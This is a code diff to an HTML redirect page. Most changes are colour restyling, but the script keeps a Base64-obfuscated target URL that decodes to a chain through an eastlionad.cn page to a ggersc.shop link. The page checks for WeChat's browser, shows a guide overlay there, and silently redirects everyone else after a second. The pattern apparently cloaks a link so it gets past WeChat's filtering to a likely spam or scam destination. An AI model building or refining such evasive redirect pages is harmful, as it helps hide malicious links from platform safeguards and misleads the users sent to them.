@@ -8,15 +8,15 @@
     body {
       margin: 0;
       font-family: sans-serif;
-      background-color: #000;
-      color: white;
+      background-color: #fff;
+      color: #000;
       overflow: hidden;
     }
 
     .guide-overlay {
       position: fixed;
       inset: 0;
-      background-color: rgba(0,0,0,0.8);
+      background-color: rgba(255, 255, 255, 0.95);
       z-index: 9999;
       display: none;
     }
@@ -37,11 +37,12 @@
     .guide-box h2 {
       font-size: 18px;
       margin: 0;
+      color: #111;
     }
 
     .guide-box p {
       font-size: 14px;
-      color: #ccc;
+      color: #555;
       margin: 0;
     }
 
@@ -89,10 +90,9 @@
 </div>
 
 <script>
-  // Base64 加密后的跳转链接（你已提供）
+  // Base64 加密后的跳转链接
   const encodedUrl = "aHR0cDovL2Vhc3RsaW9uYWQuY24vSW5kdGx6eC5odG1sP2h0dHBzOi8vZ2dlcnNjLnNob3AvaUhkZ25YL3dpeXJ1aXdycHUvcnlldQ==";
 
-  // 更安全的 Base64 解码（安卓兼容）
   function decodeBase64(str) {
     try {
       return atob(str);
@@ -111,14 +111,13 @@
     const decodedUrl = decodeBase64(encodedUrl);
 
     if (!decodedUrl || !decodedUrl.startsWith("http")) {
-      document.body.innerHTML = "<p style='padding:20px;'>跳转地址无效，请联系管理员。</p>";
+      document.body.innerHTML = "<p style='padding:20px; color: #333;'>跳转地址无效，请联系管理员。</p>";
       return;
     }
 
     if (isWeChatBrowser()) {
       guide.style.display = "block";
     } else {
-      // 延迟跳转（让页面加载不被中断）
       setTimeout(() => {
         window.location.href = decodedUrl;
       }, 1000);
